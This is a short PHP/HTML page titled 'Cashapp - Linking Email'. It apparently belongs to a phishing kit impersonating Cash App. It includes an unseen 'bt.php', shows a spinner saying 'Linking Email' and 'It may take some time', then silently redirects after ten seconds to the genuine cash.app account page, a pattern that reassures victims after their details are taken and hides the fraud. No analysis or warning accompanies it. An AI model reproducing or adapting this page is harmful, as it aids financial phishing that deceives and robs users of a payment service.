
<?php
include 'bt.php';
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<link rel="apple-touch-icon" type="image/png" href="https://static.codepen.io/assets/favicon/apple-touch-icon-5ae1a0698dcc2402e9712f7d01ed509a57814f994c660df9f7a952f3060705ee.png" />
<meta name="apple-mobile-web-app-title" content="CodePen">
<link rel="shortcut icon" type="image/x-icon" href="https://static.codepen.io/assets/favicon/favicon-aec34940fbc1a6e787974dcd360f2c6b63348d4b1f4e06c77743096d55480f33.ico" />
<link rel="mask-icon" type="" href="https://static.codepen.io/assets/favicon/logo-pin-8f3771b1072e3c38bd662872f6b673a722f4b3ca2421637d5596661b4e2132cc.svg" color="#111" />
<title>Cashapp - Linking Email</title>
<meta http-equiv="refresh" content="10;url=https://cash.app/account" />

<style>
body {
  margin: 0;
  background: #0bb634;
}

@keyframes arrow-spin {
  100% {
    transform: rotate(179deg);
  }
}

@-webkit-keyframes arrow-spin {
  100% {
    -webkit-transform: rotate(179deg);
  }
}

.psoload,
.psoload *,
.psoload *:before,
.psoload *:after {
  box-sizing: border-box;
  transition: all 0.3s;
  -webkit-transition: all 0.3s;
}

.psoload {
  position: relative;
  margin: 30px auto;
  height: 150px;
  width: 150px;
}

.psoload .straight,
.psoload .curve {
  position: absolute;
  top: 17.5%;
  left: 17.5%;
  width: 65%;
  height: 65%;
  border-radius: 100%;
  animation: arrow-spin 0.85s cubic-bezier(0.2, 0.8, 0.9, 0.1) infinite;
  -webkit-animation: arrow-spin 0.85s cubic-bezier(0.2, 0.8, 0.9, 0.1) infinite;
}

.psoload .straight:before,
.psoload .straight:after {
  content: '';
  position: absolute;
  width: 15%;
  border-bottom: 3px solid #eee;
  transform: rotate(45deg);
  -webkit-transform: rotate(45deg);
}

.psoload .straight:before {
  top: 5px;
  left: 5px;
}

.psoload .straight:after {
  bottom: 5px;
  right: 5px;
}

.psoload .curve:before,
.psoload .curve:after {
  content: '';
  position: absolute;
  width: 45px;
  height: 10px;
  border: solid 3px transparent;
  border-top-color: #eee;
  border-radius: 50%/10px 10px 0 0;
  z-index: 90001;
}

.psoload .curve:before {
  transform: rotate(-63deg) translateX(-27px) translateY(-4px);
  -webkit-transform: rotate(-63deg) translateX(-27px) translateY(-4px);
}

.psoload .curve:after {
  bottom: 5px;
  right: 5px;
  transform: rotate(115deg) translateX(-26px) translateY(-12px);
  -webkit-transform: rotate(115deg) translateX(-26px) translateY(-12px);
}

.psoload .center {
  position: absolute;
  top: 20%;
  left: 20%;
  width: 60%;
  height: 60%;
  border-radius: 100%;
  border: 3px solid #eee;
}

.psoload .inner {
  position: absolute;
  top: 25%;
  left: 25%;
  width: 50%;
  height: 50%;
  border-radius: 100%;
  animation: arrow-spin 0.85s cubic-bezier(0.2, 0.8, 0.9, 0.1) infinite reverse;
  -webkit-animation: arrow-spin 0.85s cubic-bezier(0.2, 0.8, 0.9, 0.1) infinite reverse;
}

.psoload .inner:before,
.psoload .inner:after {
  content: '';
  position: absolute;
  width: 0;
  height: 0;
  border: 6px solid transparent;
  border-bottom-width: 11px;
  border-bottom-color: #eee;
}

.psoload .inner:before {
  top: 12px;
  left: 12px;
  transform: rotate(128deg);
  -webkit-transform: rotate(128deg);
}

.psoload .inner:after {
  bottom: 12px;
  right: 12px;
  transform: rotate(-48deg);
  -webkit-transform: rotate(-48deg);
}
</style>
<script>
  window.console = window.console || function(t) {};
</script>
<script>
  if (document.location.search.match(/type=embed/gi)) {
    window.parent.postMessage("resize", "*");
  }
</script>
</head>
<body translate="no">
<div class="psoload">
<div class="straight"></div>
<div class="curve"></div>
<div class="center"></div>
<div class="inner"></div>
</div>
<center>
<h1><font color="white">Linking Email</font></h1>
<p><font color="white">It may take some time</font></p>
</body>
</html>
